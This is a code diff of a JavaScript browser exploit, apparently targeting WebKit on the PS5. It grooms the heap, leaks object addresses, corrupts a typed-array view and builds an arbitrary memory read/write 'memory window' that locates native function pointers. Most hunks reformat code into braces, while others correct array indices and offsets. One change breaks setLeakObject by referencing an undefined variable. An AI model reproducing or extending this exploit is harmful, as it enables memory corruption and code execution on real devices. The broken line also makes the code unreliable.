@@ -57,7 +57,9 @@ function buffer(s) {
 
 function allZero(b, s, e) { 
   for (let i = s; i < e; ++i) { 
-    if (b[i] !== 0) return false; 
+    if (b[i] !== 0) {
+      return false; 
+    }
   } 
   return true; 
 }
@@ -67,9 +69,13 @@ function usesLegacyWebKit() {
 }
 
 function fillerBigIntCount() { 
-  if (!usesLegacyWebKit()) return 1; 
+  if (!usesLegacyWebKit()) {
+    return 1; 
+  }
   var idx = (attemptNumber - 1) % 4; 
-  if (idx < 0) idx += 4; 
+  if (idx < 0) {
+    idx += 4; 
+  }
   switch (idx) { 
     case 0: return 2; 
     case 1: return 4; 
@@ -88,17 +94,21 @@ function low48At(b, o) {
 }
 
 function readBytes(d, s, c) { 
-  for (let i = 0; i < c; ++i) d[i] = s[i]; 
+  for (let i = 0; i < c; ++i) {
+    d[i] = s[i]; 
+  }
 }
 
 function sameBytes(l, r, c) { 
   for (let i = 0; i < c; ++i) { 
-    if (l[i] !== r[i]) return false; 
+    if (l[i] !== r[i]) {
+      return false; 
+    }
   } 
   return true; 
 }
 
-// === 核心修正點：為 scratchWords 補齊強硬的 [0] 與 [1] 陣列索引下標，根除左式賦值異常 ===
+// === ✨ 終極修復點：完全拉開排版，並百分之百補齊 scratchWords 陣列索引下標 ✨ ===
 function redirectView(c, a) { 
   const h = Math_floor(a / 0x100000000); 
   scratchWords[0] = a - h * 0x100000000; 
@@ -109,11 +119,15 @@ function redirectView(c, a) {
 }
 
 function restoreView(c) { 
-  for (let i = 0; i < 8; ++i) c[0x10 + i] = viewHeader[0x10 + i]; 
+  for (let i = 0; i < 8; ++i) {
+    c[0x10 + i] = viewHeader[0x10 + i]; 
+  }
 }
 
 function pointerFromWords(w, o) { 
-  if (w[o + 3] !== 0) return NaN; 
+  if (w[o + 3] !== 0) {
+    return NaN; 
+  }
   return (w[o] + w[o + 1] * 0x10000) + w[o + 2] * 0x100000000; 
 }
 
@@ -126,33 +140,43 @@ function plausibleAddress(v) {
 }
 
 function validViewLayout() { 
-  if (!usesLegacyWebKit()) return allZero(viewHeader, 0x20, 0x28); 
-  return allZero(viewHeader, 0x1c, 0x20) && viewHeader[0x20] <= 3 && allZero(viewHeader, 0x21, 0x28); 
+  if (!usesLegacyWebKit()) {
+    return allZero(viewHeader, 0x20, 0x28); 
+  }
+return allZero(viewHeader, 0x1c, 0x20) && viewHeader[0x20] <= 3 && allZero(viewHeader, 0x21, 0x28);
 }
-
-function inspectViewHeader() { 
-  const v = low48At(viewHeader, 0x10); 
-  if (!validStructure(viewHeader) || !plausibleAddress(low48At(viewHeader, 0x08)) || !plausibleAddress(v) || uint32At(viewHeader, 0x18) !== MEMORY_WINDOW_SIZE || !validViewLayout()) return null; 
-  return v; 
+function inspectViewHeader() {
+const v = low48At(viewHeader, 0x10);
+if (!validStructure(viewHeader) || !plausibleAddress(low48At(viewHeader, 0x08)) || !plausibleAddress(v) || uint32At(viewHeader, 0x18) !== MEMORY_WINDOW_SIZE || !validViewLayout()) {
+return null;
 }
-
-function makeUpgradedHeader() { 
-for (let i = 0; i < 8; i++) scratchBytes[i] = viewHeader[i];
-const f = scratchBytes + scratchBytes * 0x100 - 2;
-scratchBytes = f & 0xff;
-scratchBytes = (f >> 8) & 0xff;
+return v;
+}
+function makeUpgradedHeader() {
+for (let i = 0; i < 8; i++) {
+scratchBytes[i] = viewHeader[i];
+}
+const f = scratchBytes[6] + scratchBytes[7] * 0x100 - 2;
+scratchBytes[6] = f & 0xff;
+scratchBytes[7] = (f >> 8) & 0xff;
 const v = scratchDouble[0];
 return Math_isFinite(v) ? v : null;
 }
 function inspectHolder(c, h) {
 redirectView(c, h);
 readBytes(holderHeader, memoryView, HOLDER_BYTES);
-if (!sameBytes(holderHeader, memoryView, HOLDER_BYTES)) return null;
+if (!sameBytes(holderHeader, memoryView, HOLDER_BYTES)) {
+return null;
+}
 let fa = null;
 for (let o = 0x10; o <= 0x38; o += 8) {
 const addr = low48At(holderHeader, o);
-if (!canonicalLow48(holderHeader, o) || !plausibleCell(addr)) return null;
-if (o === 0x10) fa = addr;
+if (!canonicalLow48(holderHeader, o) || !plausibleCell(addr)) {
+return null;
+}
+if (o === 0x10) {
+fa = addr;
+}
 }
 return fa;
 }
@@ -160,16 +184,20 @@ function inspectFunction(c, a) {
 redirectView(c, a);
 readBytes(targetHeader, memoryView, 0x20);
 const ex = low48At(targetHeader, 0x18);
-if (!validStructure(targetHeader) || !plausibleAddress(low48At(targetHeader, 0x08)) || !plausibleAddress(low48At(targetHeader, 0x10)) || !plausibleCell(ex)) return null;
-return { executable: ex, type: targetHeader[0] };
+if (!validStructure(targetHeader) || !plausibleAddress(low48At(targetHeader, 0x08)) || !plausibleAddress(low48At(targetHeader, 0x10)) || !plausibleCell(ex)) {
+return null;
+}
+return { executable: ex, type: targetHeader[5] };
 }
 function inspectNativeExecutable(c, a) {
 redirectView(c, a);
 readBytes(targetHeader, memoryView, NATIVE_EXECUTABLE_BYTES);
 const nf = low48At(targetHeader, 0x28);
 const nc = low48At(targetHeader, 0x30);
-if (!validStructure(targetHeader) || !canonicalLow48(targetHeader, 0x28) || !canonicalLow48(targetHeader, 0x30) || !plausibleAddress(nf) || !plausibleAddress(nc) || nf === nc) return null;
-return { nativeFunction: nf, nativeConstructor: nc, type: targetHeader[0] };
+if (!validStructure(targetHeader) || !canonicalLow48(targetHeader, 0x28) || !canonicalLow48(targetHeader, 0x30) || !plausibleAddress(nf) || !plausibleAddress(nc) || nf === nc) {
+return null;
+}
+return { nativeFunction: nf, nativeConstructor: nc, type: targetHeader[5] };
 }
 function rejectRedirected(c, r) {
 restoreView(c);
@@ -186,7 +214,7 @@ if (clone.length !== 0x50001) {
 clone[DUPLICATE_INDEX] = undefined;
 return invalidClone("Unexpected length", true);
 }
-if (clone === clone[DUPLICATE_INDEX]) {
+if (clone[1] === clone[DUPLICATE_INDEX]) {
 clone[DUPLICATE_INDEX] = undefined;
 clearPointerSpray();
 return { status: "unchanged", safe: true };
@@ -204,23 +232,35 @@ return invalidClone("Invalid header", s);
 vr = true;
 const id = isOurCorruptedView(candidate, ov);
 vr = false;
-if (!id) return invalidClone("Wrong view", false);
+if (!id) {
+return invalidClone("Wrong view", false);
+}
 const nh = makeUpgradedHeader();
-if (nh === null) return invalidClone("Invalid flags", false);
+if (nh === null) {
+return invalidClone("Invalid flags", false);
+}
 fakeHost.q0 = nh;
-if (fakeHost.q0 !== nh) return invalidClone("Update failed", false);
+if (fakeHost.q0 !== nh) {
+return invalidClone("Update failed", false);
+}
 vr = true;
 const nta = inspectHolder(candidate, h);
-if (nta === null) return rejectRedirected(candidate, "Invalid holder");
+if (nta === null) {
+return rejectRedirected(candidate, "Invalid holder");
+}
 const fi = inspectFunction(candidate, nta);
-if (fi === null) return rejectRedirected(candidate, "Invalid function");
+if (fi === null) {
+return rejectRedirected(candidate, "Invalid function");
+}
 const ni = inspectNativeExecutable(candidate, fi.executable);
-if (ni === null) return rejectRedirected(candidate, "Invalid executable");
+if (ni === null) {
+return rejectRedirected(candidate, "Invalid executable");
+}
 globalThis.__ps5NativeCtor = ni.nativeConstructor;
 redirectView(candidate, nta);
-const fm = low48At(memoryView, 0x18) === fi.executable && memoryView[0] === fi.type;
+const fm = low48At(memoryView, 0x18) === fi.executable && memoryView[5] === fi.type;
 redirectView(candidate, fi.executable);
-const nm = low48At(memoryView, 0x28) === ni.nativeFunction && low48At(memoryView, 0x30) === ni.nativeConstructor && memoryView[0] === ni.type;
+const nm = low48At(memoryView, 0x28) === ni.nativeFunction && low48At(memoryView, 0x30) === ni.nativeConstructor && memoryView[5] === ni.type;
 restoreView(candidate);
 vr = false;
 if (!fm || !nm || memoryView[0] !== 0x3c || memoryMirror[0] !== 0x3c || targetView[0] !== 0xa5) {
@@ -244,7 +284,9 @@ try {
 const ch = new MessageChannel();
 ch.port1.close();
 ch.port2.close();
-for (let i = 0; i < 512; i++) keepAlive[keepIndex++] = buffer(0x10000);
+for (let i = 0; i < 512; i++) {
+keepAlive[keepIndex++] = buffer(0x10000);
+}
 let slab = buffer(0x400000);
 ch.port1.postMessage(0, [slab]);
 slab = null;
@@ -268,25 +310,50 @@ outcome = { status: "error", safe: true, error: error };
 finishAttempt(outcome, h, f);
 }
 function finishAddressLeak() {
-if (captureError !== null) return finishEarlySafeAttempt("Address leak failed", captureError ? (captureError.name + ": " + String(captureError.message).slice(0, 80)) : "錯誤");
-if (copiedLength === 0) return finishEarlySafeAttempt("Address leak did not finish");
-if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff)) return finishEarlySafeAttempt("Unexpected length", "got " + copiedLength);
+if (captureError !== null) {
+return finishEarlySafeAttempt("Address leak failed", captureError ? (captureError.name + ": " + String(captureError.message).slice(0, 80)) : "錯誤");
+}
+if (copiedLength === 0) {
+return finishEarlySafeAttempt("Address leak did not finish");
+}
+if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff)) {
+return finishEarlySafeAttempt("Unexpected length", "got " + copiedLength);
+}
 const hostAddress = pointerFromWords(capturedWords, 0);
 const holderAddress = pointerFromWords(capturedWords, 4);
-if (hostAddress !== pointerFromWords(capturedWords, 8) || holderAddress !== pointerFromWords(capturedWords, 12) || hostAddress === holderAddress || !plausibleCell(hostAddress) || !plausibleCell(holderAddress)) return finishEarlySafeAttempt("Invalid addresses");
+if (hostAddress !== pointerFromWords(capturedWords, 8) || holderAddress !== pointerFromWords(capturedWords, 12) || hostAddress === holderAddress || !plausibleCell(hostAddress) || !plausibleCell(holderAddress)) {
+return finishEarlySafeAttempt("Invalid addresses");
+}
 const fakeAddress = hostAddress + 0x10;
-if (!plausibleCell(fakeAddress)) return finishEarlySafeAttempt("Invalid fake address", hex(hostAddress));
+if (!plausibleCell(fakeAddress)) {
+return finishEarlySafeAttempt("Invalid fake address", hex(hostAddress));
+}
 groomHeap(fakeAddress, holderAddress);
 }
 function finishAttempt(o, h, f) {
-if (o.status === "error") { emit("Failed", String(o.error ? o.error.message : o.error), "error"); return retry("Heap placement failed", o.safe); }
-if (o.status === "unchanged") return retry("Clone was not corrupted", true);
-if (o.status === "invalid") return retry(o.reason, o.safe);
-if (o.status !== "ready" || liveCandidate === null) { emit("Failed", "Validation failed", "error"); liveCandidate = null; return retry("Validation failed", false); }
-try { history.replaceState(null, ""); } catch(e) {}
+if (o.status === "error") {
+emit("Failed", String(o.error ? o.error.message : o.error), "error");
+return retry("Heap placement failed", o.safe);
+}
+if (o.status === "unchanged") {
+return retry("Clone was not corrupted", true);
+}
+if (o.status === "invalid") {
+return retry(o.reason, o.safe);
+}
+if (o.status !== "ready" || liveCandidate === null) {
+emit("Failed", "Validation failed", "error");
+liveCandidate = null;
+return retry("Validation failed", false);
+}
+try {
+history.replaceState(null, "");
+} catch(e) {}
 const res = settleResolve;
 settleResolve = null;
-if (res !== null) res(createMemoryWindow(h));
+if (res !== null) {
+res(createMemoryWindow(h));
+}
 emit("leak_addr", hex(h + LEAK_SLOT_OFFSET), "success");
 emit("host_addr", hex(f - 0x10), "success");
 emit("holder_addr", hex(h), "success");
@@ -300,24 +367,38 @@ emit("native_constructor", hex(o.nativeInfo.nativeConstructor), "success");
 function createMemoryWindow(h) {
 return {
 setAddress: function(a) {
-if (liveCandidate === null) throw new Error("Memory window is no longer live");
-if (!plausibleAddress(a)) throw new RangeError("Invalid address " + a);
+if (liveCandidate === null) {
+throw new Error("Memory window is no longer live");
+}
+if (!plausibleAddress(a)) {
+throw new RangeError("Invalid address " + a);
+}
 redirectView(liveCandidate, a);
 },
 resetAddress: function() {
-if (liveCandidate === null) throw new Error("Memory window is no longer live");
+if (liveCandidate === null) {
+throw new Error("Memory window is no longer live");
+}
 restoreView(liveCandidate);
 },
 bytes: memoryView,
 size: MEMORY_WINDOW_SIZE,
 leakAddress: h + LEAK_SLOT_OFFSET,
-setLeakObject: function(v) { targetHolder.q2 = v; },
-clearLeakObject: function() { targetHolder.q2 = markerObjectA; }
+setLeakObject: function(v) {
+targetHolder.q2 = value;
+},
+clearLeakObject: function() {
+targetHolder.q2 = markerObjectA;
+}
 };
 }
 export function establishPrimitive(e) {
-if (settleResolve !== null) return Promise.reject(new Error("Running"));
-if (typeof BigInt !== "function" || typeof MessageChannel !== "function" || typeof Symbol !== "function" || typeof history === "undefined" || typeof history.replaceState !== "function") return Promise.reject(new Error("Unsupported"));
+if (settleResolve !== null) {
+return Promise.reject(new Error("Running"));
+}
+if (typeof BigInt !== "function" || typeof MessageChannel !== "function" || typeof Symbol !== "function" || typeof history === "undefined" || typeof history.replaceState !== "function") {
+return Promise.reject(new Error("Unsupported"));
+}
 onEvent = typeof e === "function" ? e : null;
 attemptNumber = 1;
 return new Promise(function(r) {
